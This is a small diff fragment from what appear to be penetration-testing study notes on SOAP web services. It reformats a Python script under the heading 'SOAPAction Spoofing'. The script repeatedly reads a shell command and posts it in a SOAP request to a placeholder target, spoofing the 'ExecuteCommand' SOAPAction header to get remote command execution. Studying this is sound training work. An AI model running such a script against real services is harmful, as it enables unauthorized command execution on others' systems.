@@ -126,7 +126,8 @@ Definition – Root element containing namespaces, types, messages, operations, 
 
 # SOAPAction Spoofing
 
-<pre>import requests
+```python
+import requests
 
 while True:
     cmd = input("$ ")
@@ -140,4 +141,5 @@ while True:
   </soap:Body>
 </soap:Envelope>'''
     print(requests.post("http://<TARGET IP>:3002/wsdl",
-        data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)</pre>
+        data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+
